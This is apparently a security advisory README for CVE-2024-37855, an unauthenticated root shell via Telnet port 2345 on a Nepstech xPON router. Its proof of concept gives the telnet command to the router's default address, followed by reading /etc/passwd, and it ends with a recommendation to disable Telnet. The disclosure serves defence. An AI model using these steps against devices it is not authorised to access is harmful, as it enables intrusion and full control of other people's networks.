# nepstech-xpon-router-unauthenticated-rce CVE-2024-37855.
Nepstech Wifi Router xpon (terminal) NTPL-Xpon1GFEVN v.1.0  firmware v.2.0.1 allows a remote attacker to execute arbitrary code via  the router's Telnet port 2345 without requiring authentication

## Author:
Subhodeep Baroi

## Requirement:
xpon (terminal). Model No: NTPL-XPON1GFEVN       
Hardware Version: 1.0 and Firmware Version: V2.0.1

## Proof of Concept:
### 1. Connect to the Router's Network:
 Ensure your computer is connected to the router's network, either via Wi-Fi or an Ethernet cable.

### 2. Open a Telnet Client and Connect:
   telnet 192.168.1.1 2345   (telnet service running on PORT 2345 and Router default IP Address is 192.168.1.1)

### 3 Got root Shell:
 cat /etc/passwd

## Impact:
 remote code execution (root shell)

## Recommendations:
   Disable the telnet service by default or require strong authentication for telnet access. Consider recommending users to use SSH for remote management.
